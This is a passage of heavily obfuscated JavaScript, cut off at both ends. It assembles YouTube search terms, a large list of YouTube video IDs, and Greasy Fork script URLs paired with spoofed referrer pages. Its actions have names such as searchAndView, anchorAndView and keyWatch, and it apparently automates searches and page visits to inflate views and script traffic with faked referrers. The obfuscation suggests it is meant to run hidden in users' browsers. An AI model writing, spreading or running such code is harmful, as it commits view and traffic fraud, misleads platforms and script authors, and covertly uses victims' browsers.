'\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 'st\x20ex\x20empl' + 'oyees,mr\x20b' + 'east\x20studi' + 'o,mr\x20beast' + '\x20gaming,mr' + 'beast\x20ware' + 'house,mr\x20b' + 'east\x20in\x20hi' + 'ndi,mr\x20bea' + 'st\x20podcast' + ',mister\x20be' + 'ast,mrbeas' + 't\x20last\x20to\x20' + 'leave')['split'](',')), searchTerms['push'](('minecraft,' + 'minecraft\x20' + 'hardcore,h' + 'ardcore\x20mi' + 'necraft,mi' + 'necraft\x20ch' + 'allenge,mi' + 'necraft\x20bu' + 't,minecraf' + 't\x20mod,mine' + 'craft\x20mods' + ',minecraft' + '\x20100\x20days,' + 'minecraft\x20' + 'funny,funn' + 'y\x20minecraf' + 't,minecraf' + 't\x20video,mi' + 'necraft\x20sc' + 'hool,100\x20d' + 'ays\x20minecr' + 'aft,minecr' + 'aft\x20animat' + 'ion,w\x20mine' + 'craft,mine' + 'craft\x20comp' + 'ilation,mi' + 'necraft\x20pe' + ',monster\x20s' + 'chool\x20mine' + 'craft,mine' + 'craft\x20mons' + 'ter\x20school' + ',to\x20be\x20con' + 'tinued\x20min' + 'ecraft,min' + 'ecraft\x20izl' + 'e,minecraf' + 't\x20story,mi' + 'necraft\x20mo' + 'vie,minecr' + 'aft\x20house,' + 'minecraft\x20' + 'fakir')['split'](',')), searchTerms['push'](['moomoo.io\x20' + 'zyenith']['repeatExte' + 'nd'](-0x213f * 0x1 + 0x20bf + -0x3 * -0x2e)), searchTerms['push'](['moomoo.io\x20' + 'spyder']['repeatExte' + 'nd'](-0x2252 + -0x1b3 + 0x240f)), searchTerms['push'](('bts,bts\x20v,' + 'jin\x20bts,bt' + 's\x20news,bts' + '\x20army,v\x20bt' + 's,rm\x20bts,b' + 'ts\x20rm,bts\x20' + 'jin,bts\x20sa' + 'd,sad\x20bts,' + 'bts\x20日本語,bt' + 's\x20韓国語,bts\x20' + '面白い,cctv\x20b' + 'ts,suga\x20bt' + 's,army\x20bts' + ',bts\x20live,' + 'kpop\x20bts,j' + 'imin\x20bts,j' + 'hope\x20bts,b' + 'ts\x20funny,b' + 'ts\x20日本語字幕,b' + 'ts\x20update,' + 'bts\x20future' + ',bts\x20eatin' + 'g,bts\x20stre' + 'ams,bts\x20日本' + '語字幕最新,taeh' + 'yung\x20bts,j' + 'ungkook\x20bt' + 's,bts\x20reac' + 'tion,bts\x20s' + 'truggle,bt' + 's\x20marriage' + ',bts\x20jungk' + 'ook,bts\x20面白' + 'い\x20日本語字幕,bt' + 's\x20playlist' + ',bts\x20play\x20' + 'game,bts\x20n' + 'ew\x20video,b' + 'ts\x20news\x20to' + 'day,bts\x20in' + 'terview')['split'](',')), searchTerms = searchTerms['flat'](-0x4 * 0x2d7 + -0x2f * 0x47 + 0x1868);
const hookPlaylistPoints = [
    'eHpl-BjXo5' + '8',
    '-PgyODlV6V' + '8',
    'S9EkXX0QYD' + 'U',
    'WvcG1OKdHW' + 'o',
    'b6gOcEwtZ8' + 'U',
    'apdtzA0Dzf' + 'k',
    'YiukDwYv2K' + '4',
    'zK-6UH5R5X' + '8',
    'bIXqNjtsEf' + '4',
    '3l253rESkw' + 'Q',
    'u6RVZKcN9z' + 'Q',
    '6ImZdwpdwT' + 'A',
    '0qPB5ANSBK' + 'c',
    '92duH3cqn1' + 'M',
    'b5lKI78fw3' + 's',
    'zpCCPZfP8L' + 'I',
    'ES7oooakr-' + 'c',
    '2eWyJ8FBvQ' + '8',
    'O4-B3OFPDf' + 'Q',
    'JFcnGk0_u7' + 'o',
    'AP7d2Ghq6d' + 'U',
    'UizEAwrZAG' + 'I',
    '0FAi5-h8Hj' + '0',
    'CNqA6IYj17' + 'k',
    'tSiKyCpwnS' + 'Y',
    'OrglyeV5xP' + 'Y',
    'BXkB-g4eCc' + 's',
    'Y53CmmpbOJ' + 's',
    'sm5MLz_IrQ' + 'k',
    'EuciRU_Ska' + '0',
    'cCbDCTLyPc' + 'E',
    'Ox7Ng5T7bm' + 'c',
    'TXTaB-dQg-' + '0',
    '3jSWaWgr_A' + '0',
    'xT8nvuxCRB' + 'E',
    '3c4Ab9EmRg' + 'Y',
    '2kScgeNOpL' + '8',
    't22jhowMom' + 'c',
    'HbcDLgkmXL' + 's',
    'JsKZ41uTeg' + 'c',
    'dfU48FRgs0' + 'g',
    '3K9ILewnUk' + 'o',
    'QmKwnRiKhD' + 'k',
    'n3nVsWsL6I' + 'k',
    'noTs52D_Mw' + 'Y',
    'A0tDR4nTTK' + '0',
    '9eBwFca-B1' + '4',
    'moasU30H5l' + 'A',
    '_Mb8oQtSBW' + 'E',
    'TNGGOgwPtc' + 'M',
    '-pYA-gjkQ8' + 's',
    '5d-dB6tZZA' + 'o',
    '8H2AiOV0oE' + 'o',
    'mI7aiKDGde' + 'w',
    'D-IMDYrj35' + '4',
    'gKgFiEgghy' + 'g',
    'mjVwfjJ2nj' + 'k',
    '6auDBi-D2H' + 'M',
    'X89-SWNdIE' + 'k',
    'T5Pn4LhIwj' + 'M',
    'wVnKGSjY3i' + '8',
    'g11NJftxw1' + '4',
    '9zHirkfEKk' + 'k',
    'ZyGS_AMbIa' + '4',
    'yG6bwB17ZP' + 's',
    'aytHiLe0s6' + 'U',
    'cGe-Mpw_F1' + 'w',
    'eMK7xV_nxZ' + 'o',
    'epJ2MAKa1Y' + 'Q',
    '5BNbKKMUhE' + 'o',
    'oxpAvc6tDP' + '8',
    'jRcc-NIR2R' + 'I',
    '258btO4mFw' + '4',
    'pXjJAUvSbQ' + 'A',
    '63-irfPjh2' + 'c',
    'xbrDZAFf3Q' + 's',
    'MVHMtRlesU' + 'g',
    'zed05qfHMB' + 'I',
    'nkhkxKUHsY' + 'g',
    'n4cSAqR9H1' + 'Q',
    'gOUPndcj7z' + 'I',
    'n3HBTTDHoX' + '8',
    'XIgMFHPIXv' + '4',
    'oQHKMky-_K' + 'c',
    'zfDgTzZ2nh' + '0',
    '1PYettRo-D' + 'M',
    'jzuZuwF490' + '4',
    '2DAgWTlXae' + '8',
    'keouUYA5hI' + 'k',
    'F7i7wRlGCd' + 'c',
    'uToD2c0CdJ' + 'c',
    'Y8DzpdFZZ8' + '8',
    '-rrH657DAa' + 'o',
    'QTrEEWtDks' + '4',
    'TWTSnQDuad' + 'Y',
    'a0GUyvgnzg' + 'c',
    'eSReWZQyKd' + 'E',
    'D_5pMqdKSs' + '4',
    'm0ie8gHS00' + 'I',
    '6WosqMq9ej' + 'o',
    'i0afAOlon_' + '4',
    'j_fe6PfxW4' + 'Y',
    'GfPzi8SYr0' + 'w',
    'MSgZhNCwff' + 'M',
    'wxyBC_z6bI' + '8',
    'PkQpV-Fwhs' + 'k',
    'bVD6cWOVhN' + 'U',
    'mjZOpQlHbx' + 'M',
    'k_BXkcdbBO' + 'M',
    'X72oUsFV7q' + '0',
    'lONsILfq-W' + 'Y',
    'Bhe9PyM_s_' + 'Q',
    'Bhe9PyM_s_' + 'Q',
    'h4TBnDkX4y' + 'o',
    'PNBJyHEkfk' + '4',
    'L3iHS__ufc' + 'g',
    'm7aliUAwm_' + 'Y',
    'FuPVf85zMi' + 'w',
    'gtupAeNTDS' + 'M',
    'yyJ8zkckoB' + '8',
    'ZDTESiN1eS' + 'w',
    'Fo6x16DkoR' + 'o',
    'IAJqRxhVqO' + 'k',
    'KAgwII8TGj' + 'o',
    'o4tLCshmlb' + 'M',
    'dLj5fIupdA' + 'o',
    '_Xl_-b9P4U' + 'Q',
    'V3NxxpUUfW' + 'E',
    'J3ygeDEMnO' + 'w',
    'HcP_xmdwsl' + 'c',
    'M9g0h7px2_' + 'M',
    'b5WfUvcSgr' + 'U',
    'JGHnIshsoC' + 'E',
    'x2gfhCLHd9' + '4',
    'M5Fr8G0ma9' + 'o',
    '3sGeIBfFlC' + 'M',
    'k74y4KOJ2m' + '4',
    'pTHJB0S8E-' + 'U',
    'KaIrXJLfYP' + 'M',
    '0cisZkywhg' + 'Q',
    '0dVzItbl9E' + 'w',
    't0EqnhcSb1' + 's',
    'MuiXtvo1RY' + 'E',
    'Nj-3KC6knH' + 'w',
    'B19HbETNi5' + '8',
    'yKN_QkroH6' + 's',
    'U9ExFM1pji' + '0',
    'sONzDfjKhL' + '4',
    'n3Kj8zEfew' + 'U',
    'nXLGQ7QeoG' + 'Y',
    'OQFQiwiM-P' + 'Y',
    'UtPRpKRTtH' + 'U',
    'E56Myp0BzE' + 'E',
    '7DjOp_JM2Z' + 'w',
    'rNFLQFz_G1' + 'g',
    '1r2pKoVAdj' + 'M',
    'gm3eiv6UND' + 'M',
    'yOiROfjxzX' + 'o',
    'lt2AcxC_ap' + 'g',
    'bObEme2BDO' + 'E',
    '6Ut6HbJmW4' + 'w',
    'fUs0TtQQTo' + '0',
    '_phHS3FAgW' + 'Q',
    '1f8sU4l3dP' + '4',
    'HwTSLUd53K' + '8',
    'EpP2ymD_QG' + 'A',
    'TQ69QFqmbo' + 'I',
    'wA8BqUka_u' + '0',
    'bc8Ey-vuR5' + 'M',
    'PZ_uLi7ULl' + '0',
    'smu5FsnhwF' + '4',
    'dv1JluwoOb' + 'c',
    'nHotP0jbcv' + 'A',
    'iIjYNEmrVv' + 'M',
    'SeP-OZAiPb' + 'c',
    'v52PClvMFt' + 'k',
    '3loLqIPxTS' + '0',
    'jVu9mOzbSq' + 'U',
    '73SAN1vOrV' + 'k',
    'YLPxp4ntym' + 's',
    'YWXfelRk3b' + 'Q',
    'CsxlLMb6Uj' + 'o',
    'uafGOfwzpa' + 'Q',
    'XIr8qotHOI' + 'E',
    'EcoPCWC3Uh' + 'o',
    'AhOwyT8aIh' + 'g',
    't-Ox7lI5UH' + 's',
    'i08qNmssXe' + 'Q',
    'QrJIU09eD-' + 'g',
    'QvNNCQ-8Rp' + 'E',
    'k5gjnjDFAZ' + 's',
    'h_NQ3y1ek8' + 'U',
    'evPsJlNLy_' + '4',
    'qEPTydgwh4' + 's',
    'LB685ckhuf' + 'E',
    'Lj1EcSMGey' + '0',
    'OE19r7MIMW' + 'Q',
    'u8E3p0Vy-P' + 'Y',
    'f4a5OPFQa7' + 'k',
    'XDo7Q7yUEt' + 'k',
    'Vw_9zw0qHI' + 'c',
    'KGT5nbDsI_' + '8',
    'E008Eql59M' + 'Q',
    'wSOFdefX47' + 'A',
    '2xcv7q3QhR' + 'E',
    'hgfvmcBkc0' + '4',
    '0wP7csnX7k' + '4',
    'Xo0R8WiRSb' + '4',
    '8zNp8EOpGd' + '4',
    'sWYhIJZmoS' + 'E',
    'YdG8U1W-bX' + '0',
    'QeDsoSNml-' + 'c',
    'xW5q77El0x' + '8',
    'ZF14issJFE' + 'Y',
    'TRglEGLLKX' + 'o',
    'UE0SXc5k1e' + 'g',
    '6VY65D8f3D' + 'Q',
    'Iwxuob4fA8' + 'Q',
    'M4elJHCUIi' + 's',
    'GY9WWhO504' + 'k',
    'eErUSxmLDw' + '8',
    'ITQfAfzLj3' + 'I',
    'vbDrCL2FuL' + 'g',
    'KyQ_sUgtbK' + 'U',
    'lbEJcipUp8' + 'I',
    '2SqCn2LreN' + 'g',
    '1i-G2TUn41' + '0',
    's0ru6uK7vi' + '8',
    'gOxiE5UAAD' + 'w',
    'lx1rOOjekc' + '8',
    '5VYN2zA-Si' + 'k',
    'q9rLWEAzoo' + 'k',
    '4KSm3IY7Xz' + 'g',
    'fMqRu_ON-D' + 'E',
    'GfvShU6Sy9' + 'A',
    'OHzOmi1b60' + 'Y',
    'D9oTUKT-_n' + 'A',
    '_BrT2PlUiw' + '0',
    'kuuI4LzKgm' + 'I',
    '78dymyg88r' + 'M',
    'mi0nGt2B-q' + 'o',
    'HaI7BjnwnO' + 'c',
    'xlAEOkIuy7' + 'Y',
    '3VmtckvTXl' + 'U',
    'ed7TWHKDr4' + 'E',
    '2LfTjyVtbf' + 'U',
    'STHlCkloyv' + 'E',
    '-BI_-6YnM6' + 'Y',
    'LSK_G1qCQw' + 'M',
    '4tzqIl6EKV' + 'k',
    '9DshU55EiV' + '8',
    'mBtaEI_6e8' + 's',
    '960lvuduwY' + 'w',
    'XWJH-6J5Ee' + 'g',
    'XLS4qmyCAX' + 'g',
    '8cJDYeRiLn' + 'k',
    'cCaIVrltHz' + 'w',
    '8X2fF4pgM0' + 'E',
    '6s8Xm4wylr' + '4',
    'eFceshvavn' + 'o',
    '2h4g7euqR-' + 'U',
    'ujiBqXnn92' + '8',
    'w9F2NST-9j' + 's',
    'w-oc7F5Mmy' + 'U',
    'UYrmqL3cOD' + 'U',
    '4QB59etj0I' + 'o',
    'MY9MTNgXcN' + 'o',
    'ISBmcKDS5C' + '8',
    'ogIb7A7tvW' + '0',
    '-L583IZF6s' + 'k',
    'NbeKQq29ZL' + '0',
    'SPplDxd74F' + 's',
    'MHGV8QmpAz' + 'k',
    'iWzezFWpU7' + 'A',
    'NNCQt1rXXE' + 'Y',
    'bcb_ZhJJK8' + 'g',
    '3KoZGQiY6N' + 'o',
    'aSaXQH8F1_' + 'A',
    'V5nMOhI62o' + 'w',
    'JvlPjRUdId' + '0',
    '2gQHuClLCb' + '0',
    '5e-qDy-uUJ' + 'E',
    'oE8vC0QEWU' + 'E',
    '7cQken99yu' + 'o',
    'pmzu080j7r' + 'I',
    'sVy9F4whP6' + 'o',
    'MJrkylk7iE' + 'c',
    'XYjsTxi6oE' + '8',
    'mKlMouB6tp' + '0',
    'o2yunZQley' + 'A',
    'oRryU9F9Lv' + 's',
    'uzzK-052H0' + 'c',
    'VSvA4rCe-4' + 'M',
    'XURH2u_0fM' + 'I',
    'yfpVL2g_tk' + 'o',
    'AuEEjQ8x9o' + 'w',
    'wWkviY8zBr' + 'c',
    'zt_eubHWhx' + 'c',
    'O_7_BGU3u_' + '0',
    'QFDKBxmOn3' + 'Y',
    'w6gccNWXXv' + 'g',
    'VdNJxbrqdX' + 's',
    'wbi5Dxebvn' + 'I',
    'XEFOREYrJg' + 'k',
    'I2rcRta7WJ' + '0',
    'OP5KGfXHX_' + 'A',
    'w2MUMbbwlm' + 'o',
    'X3bF0nd6kf' + 'w',
    'WDDAhASf9j' + 'w',
    'fRwcV8gjbc' + 'w',
    '7T63gaRThr' + '0',
    'zC8AWIwhbf' + 's',
    'JSkVE0n-ee' + 'o',
    'qiQA5pWWRt' + 'U',
    'QdXCjZtfXu' + 'c',
    'vlBji8TOax' + 'o',
    'pBx_5CbIcp' + 'o',
    'L1Oy5F6ZMO' + 'Q',
    'P0NjLaBed-' + 'E',
    'DR16C4-keB' + '0',
    'LGmpIpu9eD' + 'w',
    'rNkX_A4kBA' + 'Q',
    'QztVMjrEk4' + '0',
    'uOM6m6KL5d' + '4',
    'g-Aju8xrrO' + 'E',
    'DfkDbFk_x9' + '8',
    'Y4NLDaowD6' + 'I',
    'ALSZnqQTuJ' + 'o',
    'xUmB6BpZBE' + 'w',
    'SxNOcZ1s85' + '8',
    '-noeCjO416' + 'k',
    'taPJqXBI8V' + 'Y',
    'YxqbkMi1Is' + '4',
    'vnJTyve2r-' + '4',
    '44lRVYQ38E' + 'Q',
    'QOv1N1X5J-' + 'g',
    'jNjREs7ODT' + 'g',
    'U30ToJo3dd' + 'k',
    'rm7lNIIOQC' + 'Y',
    'mGU6sOPlYv' + 'c',
    '6pwxUXdt6T' + 'Q',
    '6MkJRee35a' + 'Q',
    'LVbf7U9WAI' + 'c',
    'gPbhFvEeJ3' + 'M',
    'LWXAxz0MiH' + 'A',
    'L0KQJqfwJJ' + 'Y',
    'GWr33_u0VK' + 'c',
    '4ud3ZPfWkH' + 's',
    'dxSrySC4XM' + 'c',
    'iIM2KZC69W' + '0',
    '8DuJ3BAwME' + 'o',
    'm3BAhe1wsl' + 'Y',
    '02U_3pAZxM' + '8',
    '0e7nidPa97' + 'g',
    'TixW__6Eer' + 'o',
    'q46W8MTRTC' + 'E',
    'Jdxp04Je1O' + 'w',
    'HfP4TO3gfN' + '0',
    '4dUJaeB0qL' + '8',
    'xnL-fRJ3RZ' + 'o',
    'yJbD0Df45u' + 'Q',
    '-pGw8RkSSB' + 'k',
    '7cy86Njsis' + 'M',
    'jbgqvxtauo' + '4',
    'N8M00JjSVI' + 'I',
    'MfR5q6Td3R' + 'c',
    'eHwcx94wcp' + 's',
    'olDgVFgAgP' + 'o',
    'eAAd5BmzXz' + 'M',
    'xgTjQ2sGXd' + '4',
    'ipny6JUbzw' + 's',
    'WOwQ0UxbRj' + '4',
    'h0PKFed2GB' + 's',
    'JxdOrgzq7Z' + '8',
    '-VgpSWWW-8' + 'w',
    '-ix4OizkAn' + 's',
    'd3CRE9y3YV' + 's',
    '4QZlfXxorJ' + 'o',
    'YlDpg8aCs5' + 'M',
    'Qe5WT22-AO' + '8',
    'b_rjBWmc1i' + 'Q',
    '9yjZpBq1XB' + 'E',
    'hPx-RiBKXt' + 'Q',
    'UMqLDhl8PX' + 'w',
    'DlJEt2KU33' + 'I',
    'BWeqoARup-' + 'Q',
    '2Dx76lD8Sc' + 'c',
    'j_nI6G3ZDi' + 'E',
    'zvcUYYN1sx' + 'w',
    'cWRkYo1S3L' + '4',
    'cWRkYo1S3L' + '4',
    'bxC_PN3SRv' + 'I',
    '94m93T_5JL' + 'M',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'RBSHAH4iWU' + '8',
    'bo9fTeXvSi' + 'A',
    'z6LqXiAK-8' + '0',
    '5tbOspjJ5f' + '0',
    'twQ6kKjtBk' + 'Y',
    'Ig17K38Fy0' + 'Y',
    'ZdlrVDwn_a' + '4',
    'aCT4Lddunx' + 'g',
    'acAvMGQtln' + 'M',
    '8XkcbdSRdO' + '0',
    '0e3GPea1Ty' + 'g',
    'zxYjTTXc-J' + '8',
    '9bqk6ZUsKy' + 'A',
    'plSyrHqUh7' + '8',
    'HkvQywg_uZ' + 'A',
    'lADBHDg-Jt' + 'A',
    'I2O7blSSzp' + 'I',
    'kd2KEHvK-q' + '8',
    'CbUjuwhQPK' + 's',
    'fb7T1v_VHp' + 'E',
    'SpeSpA3e56' + 'A',
    'RQdxHi4_Pv' + 'c',
    'nx2-4l4s4N' + 'w',
    'tUTCq3iiw_' + '4',
    'VDa5iGiPgG' + 's',
    'S-sJp1FfG7' + 'Q',
    'Hm1YFszJWb' + 'Q'
  ],
  GlobalActions = [
    searchAndView,
    anchorAndView,
    frontScreenActions,
    keyWatch
  ],
  wait = f => new Promise(h => setTimeout(h, f)),
  scriptTargets = [{
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/457024' + '-surviv-io' + '-xclient-b' + 'eta',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/surviv.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/404065' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E7%B2%BE%E' + '7%81%B5',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/51cto.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/22545-' + 'anti-bd-re' + 'direct',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/baidu' + '.com?page=' + '4'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/385' + '044-zhihu-' + 'anonymous-' + 'users',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/302' + '36-zhihu-l' + 'ink-fix',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/zn-CN/s' + 'cripts/by-' + 'site/zhihu' + '.com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/435948' + '-btb',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430335' + '-wb-script',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430572' + '-beautify-' + 'the-baidu-' + 'homepage',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/zhihu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/410781' + '-diep-io-a' + 'nti-afk-ti' + 'meout',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/1196-v' + 'iew-youtub' + W(0x0, 'TIW%'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/21012-' + 'youtubeext',
      'preRef': 'https://gr' + 'easyfork.o' + X(0x12) + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20798-' + 'youtube-hi' + 'de-volume-' + 'control',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/9090-y' + 'outube-add' + '-video-id-' + 'text-field',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/20710-' + 'calm-down-' + 'youtube',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39544-' + 'youtube-po' + 'lymer-disa' + 'ble',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/412698' + '-youtube-a' + 'uto-skip-a' + 'ds',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/413965' + '-youtube-l' + 'ike-dislik' + 'e-video-an' + 'd-skip-ad-' + 'keyboard-s' + 'hortcuts-f' + 'ork-from-n' + 'erevar009',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/39919-' + 'youtube-su' + 'ggested-vi' + 'deo-hider-' + 'for-youtub' + 'e-classic',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414756' + '-requestho' + 'ok',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/414876' + '-live-chat' + '-mod-calib' + 'er',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40462-' + 'youtube-no' + '-resume',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/40517-' + 'youtube-re' + 'sume',
      'preRef': 'https://gr' + X(0xc) + 'rg/en/scri' + 'pts/by-sit' + 'e/youtube.' + 'com?page=9'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/415706' + '-moomoo-io' + '-remove-co' + 'okie-prefe' + 'rences-tab',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405955' + '-web-secur' + 'ity',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/381682' + '-html5%E8%' + 'A7%86%E9%A' + '2%91%E6%92' + '%AD%E6%94%' + 'BE%E5%99%A' + '8%E5%A2%9E' + '%E5%BC%BA%' + 'E8%84%9A%E' + '6%9C%AC',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429635' + '-always-on' + '-focus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/30310-' + 'removeads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/455853' + '-%E7%BD%91' + '%E9%A1%B5%' + 'E8%AE%BF%E' + '9%97%AE%E5' + '%8A%A0%E9%' + '80%9F%E5%9' + '9%A8',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454941' + '-hcaptcha-' + 'captcha-so' + 'lver-by-no' + 'captchaai',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/baidu.co' + 'm'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/374794' + '-lift-web-' + 'restrictio' + 'ns-io-game' + '-mods-moom' + 'oo-io-krun' + 'ker-io-ad-' + 'link-bypas' + 'ser-adbloc' + 'k-more',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x2) + 'e/discord.' + 'com'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/407994' + '-mope-io-a' + 'uto-dive-a' + 'uto-boost-' + 'see-people' + '-underwate' + 'r-see-invi' + 'sible-play' + 'ers-remove' + '-ads',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + Y(0x2) + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
